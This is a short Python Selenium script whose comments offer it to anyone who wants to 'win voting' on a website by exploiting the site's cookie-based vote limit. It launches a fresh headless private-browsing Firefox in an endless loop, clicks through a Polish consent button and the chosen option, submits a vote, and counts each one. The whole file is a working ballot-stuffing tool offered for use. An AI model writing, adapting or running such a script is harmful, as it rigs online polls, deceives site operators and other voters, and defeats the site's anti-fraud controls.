#-*- coding: utf-8 -*-
#Script uses weaknes with voting at site with coockies memory:
#If you want to win voting just use it:
#	ARGS:
#	     1)url of site with voting
#	     2)id of element
#
import time,os,sys
import random as r
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait as wait
urlSite,elId=sys.argv[1],sys.argv[2]
print("Preparing votting on {} elId:".format(urlSite,elId))
options=Options()
options.headless=True
print("!PROFILE")
profile = webdriver.FirefoxProfile()
profile.set_preference("browser.privatebrowsing.autostart", True)
i=0
print("Start")
while(1):
 driver=webdriver.Firefox(firefox_profile=profile,options=options)
 driver.get("{}".format(urlSite))
 wait(driver, 10).until(EC.element_to_be_clickable((By.XPATH, "//span[text()='Przejdź do serwisu']"))).click()
 time.sleep(3)
 driver.find_element_by_id(elId).click()
 time.sleep(r.randint(1,5))
 driver.find_element_by_xpath(("/html/body/div[2]/div[3]/div/article/div[1]/div/div[1]/div[1]/div[2]/div[2]/div/div/pi-page/div/pi-group[3]/div/pi-element/div/dynamic-proxy/div/div/button")).click()
 i=i+1
 print("No. Votes: i="+str(i)+" Success!!")
 driver.close()
